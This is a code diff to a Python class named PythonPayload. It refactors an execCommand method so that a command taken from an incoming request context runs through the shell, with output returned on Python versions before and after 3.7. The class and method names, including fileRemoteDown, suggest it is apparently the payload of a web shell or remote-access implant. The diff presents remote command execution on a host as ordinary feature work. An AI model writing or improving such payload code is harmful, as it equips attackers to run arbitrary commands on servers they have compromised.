@@ -312,23 +312,42 @@ class PythonPayload:
         except Exception:
             return 'fail'
 
-    async def execCommand(self, ctx) -> str:
-        cmd = ctx.get('executableFile') or ctx.get('cmd') or ''
-        args = ctx.get('executableArgs') or ''
+    def exec_command_compatible(self,cmd_str, timeout=60):
+        kwargs = {
+            'shell': True,
+            'timeout': timeout
+        }
+
+        if sys.version_info >= (3, 7):
+            kwargs['capture_output'] = True
+            kwargs['text'] = True
+        else:
+            kwargs['stdout'] = subprocess.PIPE
+            kwargs['stderr'] = subprocess.PIPE
+            kwargs['universal_newlines'] = True
 
         try:
-            result = subprocess.run(
-                f"{cmd} {args}",
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=60
-            )
-            return result.stdout + result.stderr
+            result = subprocess.run(cmd_str, **kwargs)
+            output = ""
+            if result.stdout:
+                output += result.stdout
+            if result.stderr:
+                output += result.stderr
+            return output
         except subprocess.TimeoutExpired:
             return "Command execution timed out"
         except Exception as e:
             return str(e)
+
+    async def execCommand(self, ctx) -> str:
+        cmd = ctx.get('executableFile') or ctx.get('cmd') or ''
+        args = ctx.get('executableArgs') or ''
+        command_str = f"{cmd} {args}".strip()
+
+        if not command_str:
+            return "No command specified"
+
+        return self.exec_command_compatible(command_str, 60)
 
     async def fileRemoteDown(self, ctx) -> str:
         import urllib.request
